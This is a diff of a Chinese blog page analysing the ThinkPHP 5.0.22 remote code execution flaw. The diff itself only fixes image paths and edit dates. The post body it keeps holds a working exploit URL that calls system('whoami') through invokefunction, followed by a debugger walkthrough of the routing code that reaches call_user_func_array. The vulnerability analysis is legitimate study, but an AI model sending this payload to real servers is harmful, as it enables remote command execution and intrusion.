@@ -27,33 +27,33 @@
 <meta property="og:site_name" content="一giao我里giao">
 <meta property="og:description" content="前言THINKPHP5.0.22远程代码执行漏洞分析及复现">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://yoursite.com/.com//17.png">
-<meta property="og:image" content="http://yoursite.com/.com//2.png">
-<meta property="og:image" content="http://yoursite.com/.com//3.png">
-<meta property="og:image" content="http://yoursite.com/.com//4.png">
-<meta property="og:image" content="http://yoursite.com/.com//5.png">
-<meta property="og:image" content="http://yoursite.com/.com//7.png">
-<meta property="og:image" content="http://yoursite.com/.com//6.png">
-<meta property="og:image" content="http://yoursite.com/.com//8.png">
-<meta property="og:image" content="http://yoursite.com/.com//9.png">
-<meta property="og:image" content="http://yoursite.com/.com//10.png">
-<meta property="og:image" content="http://yoursite.com/.com//11.png">
-<meta property="og:image" content="http://yoursite.com/.com//12.png">
-<meta property="og:image" content="http://yoursite.com/.com//13.png">
-<meta property="og:image" content="http://yoursite.com/.com//14.png">
-<meta property="og:image" content="http://yoursite.com/.com//15.png">
-<meta property="og:image" content="http://yoursite.com/.com//16.png">
-<meta property="og:image" content="http://yoursite.com/.com//17.png">
-<meta property="og:image" content="http://yoursite.com/.com//18.png">
-<meta property="og:image" content="http://yoursite.com/.com//19.png">
-<meta property="og:image" content="http://yoursite.com/.com//21.png">
-<meta property="og:image" content="http://yoursite.com/.com//22.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/17.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/2.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/3.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/4.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/5.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/7.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/6.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/8.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/9.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/10.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/11.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/12.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/13.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/14.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/15.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/16.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/17.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/18.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/19.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/21.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/22.png">
 <meta property="article:published_time" content="2020-02-29T13:48:45.000Z">
-<meta property="article:modified_time" content="2020-04-10T09:16:18.297Z">
+<meta property="article:modified_time" content="2020-04-11T17:18:24.869Z">
 <meta property="article:author" content="wuwuwu">
 <meta property="article:tag" content="代码审计">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://yoursite.com/.com//17.png">
+<meta name="twitter:image" content="http://yoursite.com/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/17.png">
 
 <link rel="canonical" href="http://yoursite.com/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/">
 
@@ -203,7 +203,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-04-10 17:16:18" itemprop="dateModified" datetime="2020-04-10T17:16:18+08:00">2020-04-10</time>
+                <time title="Modified: 2020-04-12 01:18:24" itemprop="dateModified" datetime="2020-04-12T01:18:24+08:00">2020-04-12</time>
               </span>
 
           
@@ -229,47 +229,47 @@
 <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>exp如下：</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.com//17.png" alt="image-20200309202158419"></p>
+<p><img src="/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/17.png" alt="image-20200309202158419"></p>
 <p>使用debug来跟一下漏洞的触发过程</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ThinkPHP 引导文件</span></span><br><span class="line"><span class="comment">// 1. 加载基础文件</span></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/base.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 执行应用</span></span><br><span class="line">App::run()-&gt;send();</span><br></pre></td></tr></table></figure>
 
 
 
 <p>跟进run()，看到关键代码。</p>
-<p><img src="/.com//2.png" alt="image-20200310000602256"></p>
+<p><img src="/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/2.png" alt="image-20200310000602256"></p>
 <p>这里的<code>$dispatch</code>是空的，也就是未设置调度</p>
-<p><img src="/.com//3.png" alt="image-20200310001903943"></p>
+<p><img src="/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/3.png" alt="image-20200310001903943"></p>
 <p>跟进routeCheck()</p>
-<p><img src="/.com//4.png" alt="image-20200310002112545"></p>
+<p><img src="/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/4.png" alt="image-20200310002112545"></p>
 <p>其中<code>$path,$depr</code></p>
-<p><img src="/.com//5.png" alt="image-20200310002312139"></p>
-<p><img src="/.com//7.png" alt="image-20200310002842897"></p>
+<p><img src="/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/5.png" alt="image-20200310002312139"></p>
+<p><img src="/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/7.png" alt="image-20200310002842897"></p>
 <p>经过路由检测后,到这一行代码</p>
-<p><img src="/.com//6.png" alt="image-20200310002644385"></p>
+<p><img src="/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/6.png" alt="image-20200310002644385"></p>
 <p>跟进函数<code>parseUrl()</code></p>
-<p><img src="/.com//8.png" alt="image-20200310003123751"></p>
+<p><img src="/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/8.png" alt="image-20200310003123751"></p>
 <p>在这一行代码中,<code>$url</code>被分成存入<code>$path</code></p>
-<p><img src="/.com//9.png" alt="image-20200310003314054"></p>
+<p><img src="/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/9.png" alt="image-20200310003314054"></p>
 <p>解析模块，控制器，操作</p>
-<p><img src="/.com//10.png" alt="image-20200310003754654"></p>
+<p><img src="/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/10.png" alt="image-20200310003754654"></p>
 <p>然后封装路由</p>
-<p><img src="/.com//11.png" alt="image-20200310004003373"></p>
-<p><img src="/.com//12.png" alt="image-20200310004018935"></p>
+<p><img src="/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/11.png" alt="image-20200310004003373"></p>
+<p><img src="/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/12.png" alt="image-20200310004018935"></p>
 <p>回到<code>App.php</code></p>
-<p><img src="/.com//13.png" alt="image-20200310004135712"></p>
+<p><img src="/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/13.png" alt="image-20200310004135712"></p>
 <p>关键代码</p>
-<p><img src="/.com//14.png" alt="image-20200310004205934"></p>
+<p><img src="/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/14.png" alt="image-20200310004205934"></p>
 <p>跟进<code>exec()</code>这里跟进的是模块执行代码</p>
-<p><img src="/.com//15.png" alt="image-20200310004520405"></p>
+<p><img src="/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/15.png" alt="image-20200310004520405"></p>
 <p>在<code>module()</code>中</p>
-<p><img src="/.com//16.png" alt="image-20200310005005866"></p>
-<p><img src="/.com//17.png" alt="image-20200310005146448"></p>
-<p><img src="/.com//18.png" alt="image-20200310005237947"></p>
+<p><img src="/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/16.png" alt="image-20200310005005866"></p>
+<p><img src="/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/17.png" alt="image-20200310005146448"></p>
+<p><img src="/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/18.png" alt="image-20200310005237947"></p>
 <p>跟进<code>invokeMethod()</code></p>
-<p><img src="/.com//19.png" alt="image-20200310005605132"></p>
-<p><img src="/.com//21.png" alt="image-20200310005659885"></p>
+<p><img src="/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/19.png" alt="image-20200310005605132"></p>
+<p><img src="/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/21.png" alt="image-20200310005659885"></p>
 <p>到此调用<code>call_user_function()</code></p>
-<p><img src="/.com//22.png" alt="image-20200310005909300"></p>
+<p><img src="/2020/02/29/THINKPHP5-0-22%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/22.png" alt="image-20200310005909300"></p>
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnblogs.com/st404/p/10245844.html" target="_blank" rel="noopener">THINKPHP5.0.22远程代码执行漏洞分析及复现</a></p>
 
     </div>
@@ -374,7 +374,7 @@
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
